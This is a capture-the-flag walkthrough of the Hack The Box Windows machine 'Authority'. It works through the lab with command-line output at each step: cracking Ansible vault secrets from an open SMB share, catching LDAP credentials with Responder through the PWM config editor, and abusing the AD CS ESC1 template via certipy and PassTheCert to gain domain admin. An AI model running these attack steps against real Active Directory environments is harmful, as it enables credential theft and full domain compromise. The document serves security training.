---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Certipy
  - ESC-1
  - PWM
  - Ansible
  - SMBMap
  - Enum4Linux
---
# Overview

| Name        | Authority   |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 10.129.130.121
Host is up (0.16s latency).
Not shown: 65444 closed tcp ports (reset), 62 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 15:20:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-15T15:21:54+00:00; -3h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T15:21:52+00:00; -3h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-15T15:21:54+00:00; -3h00m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T15:21:52+00:00; -3h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-10-13T15:01:29
|_Not valid after:  2027-10-16T02:39:53
|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 15 Oct 2025 15:20:57 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Wed, 15 Oct 2025 15:20:55 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Wed, 15 Oct 2025 15:20:57 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Wed, 15 Oct 2025 15:21:04 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
53154/tcp open  msrpc         Microsoft Windows RPC
53200/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=10/15%Time=68EFE609%P=x86_64-pc-linu
SF:x-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/ht
SF:ml;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,\x2015\x
SF:20Oct\x202025\x2015:20:55\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\
SF:n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm
SF:'\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\
SF:x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x
SF:20Wed,\x2015\x20Oct\x202025\x2015:20:57\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:
SF:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20W
SF:ed,\x2015\x20Oct\x202025\x2015:20:57\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"
SF:0;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x2
SF:0\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20e
SF:n\r\nContent-Length:\x201936\r\nDate:\x20Wed,\x2015\x20Oct\x202025\x201
SF:5:21:04\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
SF:\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Tah
SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
SF:}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x
SF:20Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x2
SF:0the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p>
SF:<p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x
SF:20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20
SF:perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed
SF:\x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-15T15:21:46
|_  start_date: N/A
|_clock-skew: mean: -3h00m02s, deviation: 0s, median: -3h00m02s
```

```bash
$ nxc smb 10.129.130.121 --generate-hosts-file hosts
SMB         10.129.130.121  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
$ cat hosts
10.129.130.121     AUTHORITY.authority.htb authority.htb AUTHORITY
$ cat hosts | sudo tee -a /etc/hosts
```
# Enumeration & Initial Foothold
## Enum4Linux

- `-U` — Enumerate Users via RPC
- `-G` — Enumerate Groups via RPC
- `-S` — Enumerate Shares via RPC
- `-O` — Attempt to gather Operating System (OS) via RPC
- `-L` — Additional Domain Information via LDAP/LDAPS (Domain Controllers only)
- `-oJ enum4lin-scan` — Logging the command outputs to the designated file in JSON format.

```bash
$ enum4linux-ng -UGSOL 10.129.130.121 -oJ enum4lin-scan
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.130.121
[*] Username ......... ''
[*] Random Username .. 'opvokbjf'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 10.129.130.121    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 10.129.130.121    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: authority.htb

 ===========================================
|    SMB Dialect Check on 10.129.130.121    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 =============================================================
|    Domain Information via SMB session for 10.129.130.121    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: AUTHORITY
NetBIOS domain name: HTB
DNS domain: authority.htb
FQDN: authority.authority.htb
Derived membership: domain member
Derived domain: HTB

 ===========================================
|    RPC Session Check on 10.129.130.121    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'opvokbjf', password ''
[H] Rerunning enumeration with user 'opvokbjf' might give more results

 =====================================================
|    Domain Information via RPC for 10.129.130.121    |
 =====================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED

 =================================================
|    OS Information via RPC for 10.129.130.121    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

 =======================================
|    Users via RPC on 10.129.130.121    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ========================================
|    Groups via RPC on 10.129.130.121    |
 ========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ========================================
|    Shares via RPC on 10.129.130.121    |
 ========================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user
```
## SMBMap

```bash
$ smbmap -H 10.129.130.121 -u guest -p ''
[+] IP: 10.129.130.121:445	Name: AUTHORITY.authority.htb                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
```

```bash
$ smbclient //10.129.130.121/Development -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 08:20:38 2023
  ..                                  D        0  Fri Mar 17 08:20:38 2023
  Automation                          D        0  Fri Mar 17 08:20:40 2023

		5888511 blocks of size 4096. 1375872 blocks available
smb: \> cd Automation\
smb: \Automation\> ls
  .                                   D        0  Fri Mar 17 08:20:40 2023
  ..                                  D        0  Fri Mar 17 08:20:40 2023
  Ansible                             D        0  Fri Mar 17 08:20:50 2023

		5888511 blocks of size 4096. 1375872 blocks available
smb: \Automation\> cd Ansible\
lsmb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 08:20:50 2023
  ..                                  D        0  Fri Mar 17 08:20:50 2023
  ADCS                                D        0  Fri Mar 17 08:20:48 2023
  LDAP                                D        0  Fri Mar 17 08:20:48 2023
  PWM                                 D        0  Fri Mar 17 08:20:48 2023
  SHARE                               D        0  Fri Mar 17 08:20:48 2023

		5888511 blocks of size 4096. 1375872 blocks available
smb: \Automation\Ansible\> cd PWM
smb: \Automation\Ansible\PWM\> ls
  .                                   D        0  Fri Mar 17 08:20:48 2023
  ..                                  D        0  Fri Mar 17 08:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 00:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 17:19:32 2022
  defaults                            D        0  Fri Mar 17 08:20:48 2023
  handlers                            D        0  Fri Mar 17 08:20:48 2023
  meta                                D        0  Fri Mar 17 08:20:48 2023
  README.md                           A     1290  Thu Sep 22 00:35:58 2022
  tasks                               D        0  Fri Mar 17 08:20:48 2023
  templates                           D        0  Fri Mar 17 08:20:48 2023

		5888511 blocks of size 4096. 1375872 blocks available
smb: \Automation\Ansible\PWM\> cd defaults\
smb: \Automation\Ansible\PWM\defaults\> ls
  .                                   D        0  Fri Mar 17 08:20:48 2023
  ..                                  D        0  Fri Mar 17 08:20:48 2023
  main.yml                            A     1591  Sun Apr 23 17:51:38 2023

		5888511 blocks of size 4096. 1375872 blocks available
smb: \Automation\Ansible\PWM\defaults\> get main.yaml
```

Since there was PWM mentioned in scan `8443` port checked that share. There seems to be ADCS folder too which could suggest a ADCS attack vector too.

```bash
$ cat main.yml 
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
```
## Decrypting Ansible Hash

```bash
# Extract just the pwm_admin_login vault
echo '$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438' > vault1.txt

# Extract just the pwm_admin_password vault  
echo '$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531' > vault2.txt

# Extract just the ldap_admin_password vault
echo '$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566' > vault3.txt
```

```bash
ansible2john vault1.txt > vault1.john
ansible2john vault2.txt > vault2.john  
ansible2john vault3.txt > vault3.john
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt vault1.john
john --wordlist=/usr/share/wordlists/rockyou.txt vault2.john
john --wordlist=/usr/share/wordlists/rockyou.txt vault3.john
```

```bash
!@#$%^&*         (vault1.txt)    
!@#$%^&*         (vault2.txt)  
```

Let's get username first:

```bash
$ ansible-vault decrypt vault1.txt
Vault password: !@#$%^&*
Decryption successful
$ cat vault1.txt
svc_pwm
```

We got username `svc_pwn`, Now decrypt password.

```bash
$ ansible-vault decrypt vault2.txt
Vault password: !@#$%^&*
Decryption successful
$ cat vault2.txt 
pWm_@dm!N_!23
```

So creds is `svc_pwn:pWm_@dm!N_!23`.
## Web Service `8443`

![[authority.png]]
### Responder

Login with  `svc_pwn:pWm_@dm!N_!23` But this gives us error so click in that `Configuration Editor` Button and go to `https://authority.htb:8443/pwm/private/config/manager` and use this password `pWm_@dm!N_!23` nothing there so go on `Configuration Editor` `https://authority.htb:8443/pwm/private/config/editor`  and use that same password. 

```bash
sudo responder -I tun0
```

![[authority8.png]]

Change this to your IP.

![[authority9.png]]

LDAP default port is `389` when running responder. Then click in `Test LDAP Profile`.

```bash
$ sudo responder -I tun0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.122]
    Responder IPv6             [dead:beef:2::1078]
    Challenge set              [random]
    Dont Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-ZT7K2YNBQ8D]
    Responder Domain Name      [AEKZ.LOCAL]
    Responder DCE-RPC Port     [46802]

[+] Listening for events...
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

```bash
$ evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> cat user.txt
680ae24e08abf43a03464cd1c24eced4
```
# Privilege Escalation

```bash
*Evil-WinRM* PS C:\Certs> ls


    Directory: C:\Certs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
```
## Certipy

```bash
$ certipy find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251015145238_Certipy.txt'
[*] Wrote text output to '20251015145238_Certipy.txt'
[*] Saving JSON output to '20251015145238_Certipy.json'
[*] Wrote JSON output to '20251015145238_Certipy.json
```

```bash
$ cat 20251015145238_Certipy.txt
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

We found vulnerable **CorpVPN** template with **ESC1** vulnerability.
## ESC 1

Read about it [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication) in wiki.
#### Step 1: Add Machine Account to Domain

```bash
$ addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Passw0rd!' 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account EVILPC$ with password Passw0rd!.
```
####  Step 2: Request Certificate for Administrator

This will create `administrator.pfx`

```bash
$ certipy req -u 'EVILPC$' -p 'Passw0rd!' -ca 'AUTHORITY-CA' -target 10.129.229.56 -template 'CorpVPN' -upn 'administrator@authority.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

I don't know why this:

```bash
$ certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56 -domain authority.htb -username administrator
```

Gave error so tried this:

## Extract certificate and key from PFX

```bash
$ certipy cert -pfx administrator.pfx -nocert -out administrator.key
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator.key'
[*] Writing private key to 'administrator.key'

$ certipy cert -pfx administrator.pfx -nokey -out administrator.crt
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator.crt'
[*] Writing certificate to 'administrator.crt'
```

Now use PassTheCert to add `svc_ldap` to the Administrators group:

```bash
# Clone PassTheCert if you haven't already
git clone https://github.com/AlmondOffSec/PassTheCert

# Use PassTheCert to get an LDAP shell
cd PassTheCert/Python
python passthecert.py -action ldap-shell -crt ../../administrator.crt -key ../../administrator.key -domain authority.htb -dc-ip 10.129.229.56
```

```bash
$ python passthecert.py -action ldap-shell -crt ../../administrator.crt -key ../../administrator.key -domain authority.htb -dc-ip 10.129.229.56
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# add_user_to_group svc_ldap administrators
Adding user: svc_ldap to group Administrators result: OK

# exit
Bye!
```

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cat C:\Users\Administrator\Desktop\root.txt
4d7aba785a933537a911cce0a9da6174
```

---



